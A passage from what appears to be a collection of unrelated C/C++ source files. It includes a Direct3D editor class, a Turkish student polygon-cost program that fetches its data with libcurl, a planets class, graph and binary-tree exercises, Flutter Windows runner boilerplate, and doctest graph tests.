color);\n\tm_BoardVB[1].Set(ev.x, ev.y + 100.0f, ev.z, color);\n\tm_BoardVB[2].Set(ev.x, ev.y - 100.0f, ev.z, color);\n\tm_BoardVB[3].Set(sv.x, sv.y - 100.0f, sv.z, color);\n}\n\nvoid CWallMgr::MakeCube(__Vector3 cv, D3DCOLOR color)\n{\n\t__Vector3 tmp;\n\tcv.x -= 0.5f;\n\tcv.y -= 0.5f;\n\tcv.z -= 0.5f;\n\n\t//front lt...\n\ttmp = cv + m_BaseCube[0];\n\tm_CubeVB[0].Set(tmp.x, tmp.y, tmp.z, color);\t\t\t\n\ttmp = cv + m_BaseCube[1];\n\tm_CubeVB[1].Set(tmp.x, tmp.y, tmp.z, color);\t\t\t\n\ttmp = cv + m_BaseCube[2];\n\tm_CubeVB[2].Set(tmp.x, tmp.y, tmp.z, color);\n\t\n\t//front rb...\n\tm_CubeVB[3] = m_CubeVB[2];\n\tm_CubeVB[4] = m_CubeVB[1];\n\ttmp = cv + m_BaseCube[3];\n\tm_CubeVB[5].Set(tmp.x, tmp.y, tmp.z, color);\n\n\t//right lt..\n\tm_CubeVB[6] = m_CubeVB[1];\n\ttmp = cv + m_BaseCube[5];\n\tm_CubeVB[7].Set(tmp.x, tmp.y, tmp.z, color);\n\tm_CubeVB[8] = m_CubeVB[5];\n\n\t//right rb..\n\tm_CubeVB[9] = m_CubeVB[8]; \n\tm_CubeVB[10] = m_CubeVB[7];\n\ttmp = cv + m_BaseCube[7];\n\tm_CubeVB[11].Set(tmp.x, tmp.y, tmp.z, color);\n\n\t//back lt..\n\tm_CubeVB[12] = m_CubeVB[7];\n\ttmp = cv + m_BaseCube[4];\n\tm_CubeVB[13].Set(tmp.x, tmp.y, tmp.z, color);\n\tm_CubeVB[14] = m_CubeVB[11];\n\n\t//back rb..\n\tm_CubeVB[15] = m_CubeVB[14];\n\tm_CubeVB[16] = m_CubeVB[13];\n\ttmp = cv + m_BaseCube[6];\n\tm_CubeVB[17].Set(tmp.x, tmp.y, tmp.z, color);\n\n\t//left lt..\n\tm_CubeVB[18] = m_CubeVB[13];\n\tm_CubeVB[19] = m_CubeVB[0];\n\tm_CubeVB[20] = m_CubeVB[17];\t\t\t\n\n\t//left rb..\n\tm_CubeVB[21] = m_CubeVB[20];\n\tm_CubeVB[22] = m_CubeVB[19];\n\tm_CubeVB[23] = m_CubeVB[2];\n\n\t//top lt..\n\tm_CubeVB[24] = m_CubeVB[13];\n\tm_CubeVB[25] = m_CubeVB[12];\n\tm_CubeVB[26] = m_CubeVB[0];\t\t\t\n\n\t//top rb..\n\tm_CubeVB[27] = m_CubeVB[26];\n\tm_CubeVB[28] = m_CubeVB[25];\n\tm_CubeVB[29] = m_CubeVB[1];\n\n\t//bottom lt..\n\tm_CubeVB[30] = m_CubeVB[2];\n\tm_CubeVB[31] = m_CubeVB[5];\n\tm_CubeVB[32] = m_CubeVB[17];\t\t\t\n\n\t//botom rb..\n\tm_CubeVB[33] = m_CubeVB[32];\n\tm_CubeVB[34] = m_CubeVB[31];\n\tm_CubeVB[35] = m_CubeVB[14];\n}\n\n///////////////////////////////////////////////////////////////////////////\n\nvoid CWallMgr::SetActive(bool active)\n{\n\tif(m_bActive==active) return;\n\tm_bActive = active;\n\n\tif(active)\n\t{\n\t\tm_pDlg->ShowWindow(TRUE);\n\n\t\tCWall* pWall = new CWall;\n\t\tif(m_pCurrWall)\n\t\t{\n\t\t\tdelete m_pCurrWall;\n\t\t\tm_pCurrWall = NULL;\n\t\t}\n\t\tm_pCurrWall = pWall;\n\t}\n\telse\n\t{\n\t\tm_pDlg->ShowWindow(FALSE);\n\n\t\tif(m_pCurrWall)\n\t\t{\n\t\t\tdelete m_pCurrWall;\n\t\t\tm_pCurrWall = NULL;\n\t\t}\n\t}\n}\n\nBOOL CWallMgr::MouseMsgFilter(LPMSG pMsg)\n{\n\tif(!m_pRefMapMng) return FALSE;\n\tCLyTerrain* pRefTerrain = m_pRefMapMng->GetTerrain();\n\tif(!m_bActive || !pRefTerrain) return FALSE;\n\n\tswitch(pMsg->message)\n\t{\n\tcase WM_LBUTTONUP:\n\t\t{\n\t\t\tPOINT point = {short(LOWORD(pMsg->lParam)), short(HIWORD(pMsg->lParam))};\n\n\t\t\t__Vector3 vec;\n\t\t\tif(!pRefTerrain->Pick(point.x, point.y, &vec, NULL)) break;\n\n\t\t\tm_pCurrWall->AddVertex(vec);\t\t\t\n\t\t}\n\t\treturn TRUE;\n\n\tcase WM_RBUTTONUP:\n\t\t{\n\t\t\tm_pCurrWall->DelPrevVertex();\n\t\t}\n\t\treturn TRUE;\n\t}\n\treturn TRUE;\n}\n\nvoid CWallMgr::Render()\n{\n\t// set transform\n\tHRESULT hr;\n\n\tD3DXMATRIX mtx;\n\tD3DXMatrixIdentity(&mtx);\n\t\t\n\thr = s_lpD3DDev->SetTransform(D3DTS_WORLD, &mtx); // \uc6d4\ub4dc \ud589\ub82c \uc801\uc6a9..\n\t\n\t// set texture\n\thr = s_lpD3DDev->SetTexture(0, NULL);\n\thr = s_lpD3DDev->SetTextureStageState(0, D3DTSS_COLOROP, D3DTOP_SELECTARG1);\n\thr = s_lpD3DDev->SetTextureStageState(0, D3DTSS_COLORARG1, D3DTA_DIFFUSE);\n\n\t// backup state\n\tDWORD dwZEnable, dwLighting, dwCullMode;\n\thr = s_lpD3DDev->GetRenderState(D3DRS_ZENABLE, &dwZEnable);\n\thr = s_l",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <graphics.h>\r\n#include <math.h>\r\n#include <curl/curl.h>\r\n\r\nsize_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream); // curl \r\nvoid eksenciz(); // 2 boyutlu uzay duzlemini cizdiriyoruz\r\nchar* parcala(const char* str); //alinan verinin kullanilacak kismini belirliyor  \r\nint* sayilastir(char *a); //stringi integera ceviriyor\r\nint sekilsayisi(int* sayilar, int boyut,int *ay); // veride kac sekil oldugunu belirliyor\r\nvoid alanVeKareSayisiYazdir(int* coordinates, int size, float *topl,int* bks); // Alan ve Plartform degerlerini buluyor\r\nconst char* satir(const char* text, int line_number); // gelen veride secilen satiri donduruyor\r\nbool icindemi(int* polygon, int n, int x, int y); // birim karenin icersinde poligon bulunup bulunmadigini kontrol ediyor\r\nvoid platformbelirleme(int* polygon, int n); // plartformun oldugu kareleri griye boyuyor\r\nint platformSayisi(int* polygon, int n); // plartform sayisini donduruyor\r\n\r\nint main()\r\n{\r\n\t//Curl islemleri\r\n\tFILE *dosya;\r\n    CURL *curl;\r\n    CURLcode res;\r\n    long file_size;\r\n    int secim;\r\n\tfloat pMal; //plartform maliyeti\r\n\tint sMal; // sondaj maliyeti\r\n    curl = curl_easy_init();\r\n\r\n    if (curl) {\r\n        curl_easy_setopt(curl, CURLOPT_URL, \"http://abilgisayar.kocaeli.edu.tr/prolab1/prolab1.txt\");\r\n\r\n        dosya = fopen(\"yaz1.txt\", \"wb\");\r\n        if (!dosya) {\r\n            fprintf(stderr, \"Dosya a\u00e7ma hatas\u00fd\\n\");\r\n            return 1;\r\n        }\r\n\r\n        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);\r\n        curl_easy_setopt(curl, CURLOPT_WRITEDATA, dosya);\r\n\r\n        res = curl_easy_perform(curl);\r\n        fclose(dosya);\r\n\r\n        if (res != CURLE_OK) {\r\n            fprintf(stderr, \"cURL hatas\u00fd: %s\\n\", curl_easy_strerror(res));\r\n            curl_easy_cleanup(curl);\r\n            return 1;\r\n        }\r\n\t\tdosya = fopen(\"yaz1.txt\", \"r\");\r\n        fseek(dosya, 0, SEEK_END);\r\n        file_size = ftell(dosya);\r\n        rewind(dosya);\r\n\r\n        char metin[file_size + 1];\r\n        fread(metin, 1, file_size, dosya);\r\n        metin[file_size] = '\\0'; \r\n\t\tprintf(\"Cekilen veri:\\n%s\\n\\n\",metin);\r\n\t\t\r\n        printf(\"Hangi satiri cizdirmek istersiniz:\");\r\n        scanf(\"%d\", &secim);\r\n        \r\n        printf(\"\\nBirim Sondaj Maliyetini Giriniz (1-10):\");\r\n        scanf(\"%d\",&sMal);\r\n        \r\n        printf(\"\\nBirim Plartform Maliyetini Giriniz:\");\r\n        scanf(\"%f\",&pMal);\r\n        \r\n        const char* input_str = satir(metin, secim); // verideki secilen satiri input_str ye esitliyoruz \r\n\t\tprintf(\"\\nSecilen satir: %s\\n\", input_str);\r\n\t\r\n\t// input islemleri\r\n\tchar* dnm = parcala(input_str); // kullanilacak veriyi dnm ye esitle \r\n\tint* coord = sayilastir(dnm); // koordinat noktalarini integer sekilde coorda esitliyoruz\r\n\t\r\n\tint boyut= 0;\r\n\tfor(int i=0;coord[i] != '\\0';i++)\r\n\t{\r\n\t\tboyut++; // boyut bilgisi\r\n\t}\r\n\tfor(int i=0;coord[i] != '\\0';i++)\r\n\t{\r\n\t\tcoord[i] = coord[i] *16; // cizdirdi\u00f0imiz eksenin boyutlar\u00fdna uygun pikseldeki noktayi bulmak i\u00e7in 16 ile carpiyoruz \r\n\t}\r\n\tinitwindow(1920,1080); // pencere ac\r\n\tint ayrim; // iki sekil varsa ayrim indeksnin temsil eder\r\n\teksenciz();\r\n\tif(sekilsayisi(coord,boyut,&ayrim))\r\n\t{ \r\n\t\t//Tek Sekil varsa\r\n\tfloat toplmal=0;\r\n\tint birimks;\r\n \tsetfillstyle(1, RED);\r\n    fillpoly(boyut/2, coord);\r\n    alanVeKareSayisiYazdir(coord, boyut, &toplmal,&birimks);\r\n    platformbelirleme(coord, boyut);\r\n    \r\n    printf(\"\\nToplam Plartform Sayisi:%d\\n\",birimks);\r\n    \r\n    printf(\"\\nToplam Sondaj Maliyeti: %.2f\\n\", (float(sMal) * toplmal /10.0));\r\n    \r\n\tprintf(\"\\nToplam Plartform Maliyeti: %.2f\\n\", (pMal * float(birimks)));\r\n\t\r\n\tprintf(\"\\nToplam Maliyet: %.2f\\n\",((float(sMal) * toplmal /10.0) + (pMal * float(birimks))));\r\n\t\r\n\tprintf(\"\\nKar Miktari: %.2f\\n\", toplmal - ((float(sMal) * toplmal /10.0) + (pMal * float(birimks))));  \t\r\n\t\t\r\n\tsetfillstyle(1, RED);\r\n    fillpoly(boyut/2, coord);\r\n     \tchar floatStr[20];\r\n   \t \tsprintf(floatStr, \"%.2f\", toplmal);\r\n        \r\n        outtextxy(500, 20, \"Toplam Rezerv Deger:\");\r\n   \t\touttextxy(680, 20, floatStr);\r\n\t}\r\n\telse\r\n\t{\r\n\t\t// cift sekil varsa\r\n\t\tint* sekil1 = (int*)malloc((ayrim+2)* sizeof(int)); // sekil1 in koordinatlari icim bellekte alan tuttuk\r\n\t\tint* sekil2 = (int*)malloc( (boyut - ayrim)* sizeof(int)); //sekil2 nin koordinatlari icin bellekte alan tuttuk\r\n\t\tfloat toplam_alan = 0.0;\r\n\t\tfloat tAlan= 0.0;\r\n\t\tint i=0;\r\n\t\tint boyut1=0;\r\n\t\tint boyut2=0;\r\n\t\tint tPLart = 0; //toplam plartform sayisini verecek\r\n\t\tint toplam_plartf;\r\n\t\tfor(i=0;i <= ayrim;i++)\r\n\t\t{\r\n\t\t\tsekil1[i] = coord[i];\r\n\t\t\tboyut1++;\r\n\t\t}\r\n\t\tsekil1[i+1] = '\\0';\r\n\t\tfor(;coord[i] != '\\0';i++)\r\n\t\t{\r\n\t\t\tsekil2[boyut2] = coord[i];\r\n\t\t\tboyut2++;\r\n\t\t}\r\n\t\tsekil2[boyut2+1] = '\\0';\r\n\t\tsetfillstyle(1, RED);\r\n        fillpoly(boyut1/ 2, sekil1);\r\n        fillpoly(boyut2/ 2, sekil2);\r\n        //ilk sekilin kareleri\r\n        \r\n        alanVeKareSayisiYazdir(sekil1, boyut1,&toplam_alan,&toplam_plartf);\r\n        tAlan += toplam_alan;\r\n        t",
    "\n#include <stdlib.h>\n\n#include \"Planet.h\"\n#include \"Planets.h\"\n\nPlanets::Planets(int ClosestPlanet, int FarthestPlanet, int SystemCurrentDay, float SystemReloativeSize)\n{\n\tPlanet *OnePlanet;\n\n\n\tif (ClosestPlanet < 1)\n\t{\n\t\tClosestPlanet = 1;\n\t}\n\n\tif (FarthestPlanet > 8)\n\t{\n\t\tFarthestPlanet = 9;\n\t}\n\n\tif (ClosestPlanet > FarthestPlanet)\n\t{\n\t\tFarthestPlanet = ClosestPlanet;\n\t}\n\n\tClosestPlanetNumber = ClosestPlanet;\n\tFarthestPlanetNumber = FarthestPlanet;\n\tNumberOfPlanets = 1 + FarthestPlanetNumber - ClosestPlanetNumber;\n\tCurrentDay = SystemCurrentDay;\n\tReloativeSize = SystemReloativeSize;\n\n\n\tfor (int i = ClosestPlanetNumber; i <= FarthestPlanetNumber; i++)\n\t{\n\t\tswitch (i)\n\t\t{\n\t\tcase 1:\n\t\t\tOnePlanet = new Planet();\n\t\t\tOnePlanet->Set(\"Mercury\", 0.47f, 87.97f, 10, 0.4f, CurrentDay, ReloativeSize, \"Mercury\");\n\t\t\tListOfPlanets.push_back(*OnePlanet);\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tOnePlanet = new Planet();\n\t\t\tOnePlanet->Set(\"Venus\", 0.73f, 224.7f, 60, 0.9f, CurrentDay, ReloativeSize, \"Venus\");\n\t\t\tListOfPlanets.push_back(*OnePlanet);\n\t\t\tbreak;\n\t\tcase 4:\n\t\t\tOnePlanet = new Planet();\n\t\t\tOnePlanet->Set(\"Mars\", 1.67f, 686.98f, 230, 1, CurrentDay, ReloativeSize, \"Mars\");\n\t\t\tListOfPlanets.push_back(*OnePlanet);\n\t\t\tbreak;\n\t\tcase 5:\n\t\t\tOnePlanet = new Planet();\n\t\t\tOnePlanet->Set(\"Jupiter\", 5.37f, 11.86f * 365.26f, 40, 2, CurrentDay, ReloativeSize, \"Jupiter\");\n\t\t\tListOfPlanets.push_back(*OnePlanet);\n\t\t\tbreak;\n\t\tcase 6:\n\t\t\tOnePlanet = new Planet();\n\t\t\tOnePlanet->Set(\"Saturn\", 10.07f, 29.46f * 365.26f, 300, 4, CurrentDay, ReloativeSize, \"Saturn\");\n\t\t\tListOfPlanets.push_back(*OnePlanet);\n\t\t\tbreak;\n\t\tcase 7:\n\t\t\tOnePlanet = new Planet();\n\t\t\tOnePlanet->Set(\"Uranus\", 20.09f, 84.01f * 365.26f, 120, 1, CurrentDay, ReloativeSize, \"Uranus\");\n\t\t\tListOfPlanets.push_back(*OnePlanet);\n\t\t\tbreak;\n\t\tcase 8:\n\t\t\tOnePlanet = new Planet();\n\t\t\tOnePlanet->Set(\"Neptune\", 164.79f * 365.26f, 30.32f, 180, 1, CurrentDay, ReloativeSize, \"Neptune\");\n\t\t\tListOfPlanets.push_back(*OnePlanet);\n\t\t\tbreak;\n\t\tcase 9:\n\t\t\tOnePlanet = new Planet();\n\t\t\tOnePlanet->Set(\"Pluto\", 90650.0f, 48.823f, 250, 0.5, CurrentDay, ReloativeSize, \"Mercury\");\n\t\t\tListOfPlanets.push_back(*OnePlanet);\n\t\t\tbreak;\n\n\t\tdefault:\n\t\t\tOnePlanet = new Planet();\n\t\t\tOnePlanet->Set(\"Earth\", 1.0f, 365.26f, 160, 1, CurrentDay, ReloativeSize, \"Earth\");\n\t\t\tListOfPlanets.push_back(*OnePlanet);\n\t\t}\n\t}\n}\n\nPlanets::~Planets()\n{\n}\n",
    "\ufeff#define _CRT_SECURE_NO_WARNINGS\n#include <iostream>\nusing namespace std;\n\nstruct Node {\n\tint dinhke;\n\tint trongso;\n\tNode* link;\n};\n\nconst int MAX = 20;\n\nstruct DanhSachKe {\n\tNode* dsk[MAX];\n\tint sodinh;\n};\n\nbool docDanhSachKe(const char* textFile, DanhSachKe& ds) {\n\tFILE* f = fopen(textFile, \"rt\");\n\tif (f == NULL) return false;\n\t//Khoi tao ds ke\n\tfor (int i = 0; i < MAX; i++)\n\t\tds.dsk[i] = NULL;\n\n\t//Doc so dinh cua danh sach ke\n\tfscanf(f, \"%d\", &ds.sodinh);\n\n\t//Doc danh sach ke\n\tfor (int i = 0; i < ds.sodinh; i++) {\n\t\tint sodinhke;\n\t\tfscanf(f, \"%d\", &sodinhke);\n\n\t\tfor (int j = 0; j < sodinhke; j++) {\n\t\t\t//Tao 1 con tro chua dinh ke doc tu file\n\t\t\tNode* p = new Node;\n\t\t\tfscanf(f, \"%d%d\", &p->dinhke, &p->trongso);\n\t\t\tp->link = NULL;\n\n\t\t\tif (ds.dsk[i] == NULL)\n\t\t\t\tds.dsk[i] = p;\n\t\t\telse {\n\t\t\t\tNode* temp = ds.dsk[i];\n\t\t\t\twhile (temp->link != NULL)\n\t\t\t\t\ttemp = temp->link;\n\t\t\t\ttemp->link = p;\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid xuatDanhSachKe(const char* textFile, DanhSachKe ds) {\n\tfor (int i = 0; i < ds.sodinh; i++) {\n\t\tcout << \"(\" << i << \"): \";\n\t\tNode* p = ds.dsk[i];\n\t\twhile (p != NULL) {\n\t\t\tcout << \"(\" << p->dinhke << \",\" << p->trongso << \") \";\n\t\t\tp = p->link;\n\t\t}\n\t\tcout << endl;\n\t}\n}\n\nint tinhBacRa(DanhSachKe ds, int u) {\n\tint count = 0;\n\tNode* p = ds.dsk[u];\n\twhile (p != NULL) {\n\t\tcount++;\n\t\tp = p->link;\n\t}\n\treturn count;\n}\n\nint tinhBacVao(DanhSachKe ds, int u) {\n\tint count = 0;\n\tfor (int i = 0; i < ds.sodinh; i++) {\n\t\tNode* p = ds.dsk[i];\n\t\twhile (p != NULL) {\n\t\t\tif (p->dinhke == u) {\n\t\t\t\tcount++;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tp = p->link;\n\t\t}\n\t}\n\treturn count;\n}\n\n//v l\u00e0 \u0111\u1ec9nh, u l\u00e0 \u0111\u1ec9nh k\u1ec1\nvoid trongSoLonNhat(DanhSachKe ds, int& v, int& u) {\n\tNode* max = NULL;\n\tfor (int i = 0; i < ds.sodinh; i++) {\n\t\tNode* p = ds.dsk[i];\n\t\twhile (p != NULL) {\n\t\t\tif (max == NULL)\n\t\t\t\tmax = p;\n\t\t\telse if (p->trongso > max->trongso) {\n\t\t\t\tmax = p;\n\t\t\t\tv = i;\n\t\t\t}\n\t\t\tp = p->link;\n\t\t}\n\t}\n\tif(max!=NULL)\n\t\tu = max->dinhke;\n}\n\nint main() {\n\tDanhSachKe danhSach;\n\tif (docDanhSachKe(\"TextDanhSachKe.txt\", danhSach)) {\n\t\tcout << \"Danh Sach Ke:\" << endl;\n\t\txuatDanhSachKe(\"TextDanhSachKe.txt\", danhSach);\n\t\tcout << endl;\n\t}\n\telse {\n\t\tcout << \"Failed to open file!\" << endl;\n\t}\n\n\tint ra, vao;\n\tcout << \"Nhap dinh muon tinh so bac ra: \"; cin >> ra;\n\tcout << \"Bac ra cua dinh \" << ra << \": \" << tinhBacRa(danhSach, ra);\n\tcout << \"\\nNhap dinh muon tinh so bac vao: \"; cin >> vao;\n\tcout << \"Bac vao cua dinh \" << vao << \": \" << tinhBacVao(danhSach, vao);\n\n\tint v, u;\n\ttrongSoLonNhat(danhSach, v, u);\n\tcout << \"\\nDinh co trong so lon nhat: (\" << v << \",\" << u << \")\" << \" voi trong so la 10. \";//Ghi chu de khong nham lan\n\tcout << endl << endl;\n\treturn 0;\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include \"BinaryTree.h\"\nusing namespace std;\n\n// TODO: solution breath first search\n/**\n * traverser all level\n*/\n/**\n * target function\n*/\nvoid Solution::dfs_sum(TreeNode *currentNode, int targetSum, int& currentSum, vector<int>& curPath, vector<vector<int>>& ans)\n{\n    // base case\n    if (!currentNode) return;\n    currentSum += currentNode->val;\n    curPath.push_back(currentNode->val);\n    dfs_sum(currentNode->left, targetSum, currentSum, curPath, ans);\n    dfs_sum(currentNode->right, targetSum, currentSum, curPath, ans);\n\n    // confirm result\n    if (!currentNode->left && !currentNode->right) {\n        if (currentSum == targetSum) {\n            ans.push_back(curPath);\n        }\n    }\n    // remove current node\n    curPath.pop_back();\n    currentSum -= currentNode->val;\n}\n\n\n/**\n * target method\n*/\nvector<vector<int>> Solution::pathSum(TreeNode *root, int targetSum)\n{\n    int curSum = 0;\n    vector<vector<int>> ans;\n    vector<int> curPath;\n    dfs_sum(root, targetSum, curSum, curPath, ans);\n    return ans;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"contacts\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"doctest.h\"\n#include \"Algorithms.hpp\"\n#include \"Graph.hpp\"\nusing namespace std;\n\nTEST_CASE(\"Test isConnected Undirected graph\")\n{\n        ariel::Graph g;\n\n        g.setIsDirected(false);\n        vector<vector<int>> graph = {\n            {0, 1, 0},\n            {1, 0, 1},\n            {0, 1, 0}};\n        g.loadGraph(graph);\n        CHECK(ariel::Algorithms::isConnected(g) == true);\n\n        vector<vector<int>> graph2 = {\n            {0, 1, 1, 0, 0},\n            {1, 0, 1, 0, 0},\n            {1, 1, 0, 1, 0},\n            {0, 0, 1, 0, 0},\n            {0, 0, 0, 0, 0}};\n        g.loadGraph(graph2);\n        CHECK(ariel::Algorithms::isConnected(g) == false);\n}\nTEST_CASE(\"Test shortestPath\")\n{\n        ariel::Graph g;\n        vector<vector<int>> graph = {\n            {0, 1, 0},\n            {1, 0, 1},\n            {0, 1, 0}};\n\n        g.loadGraph(graph);\n        CHECK(ariel::Algorithms::shortestPath(g, 0, 2) == \"0->1->2\");\n\n        vector<vector<int>> graph2 = {\n            {0, 1, 1, 0, 0},\n            {1, 0, 1, 0, 0},\n            {1, 1, 0, 1, 0},\n            {0, 0, 1, 0, 0},\n            {0, 0, 0, 0, 0}};\n        g.loadGraph(graph2);\n        CHECK(ariel::Algorithms::shortestPath(g, 0, 4) == \"No path found\");\n}\nTEST_CASE(\"Test 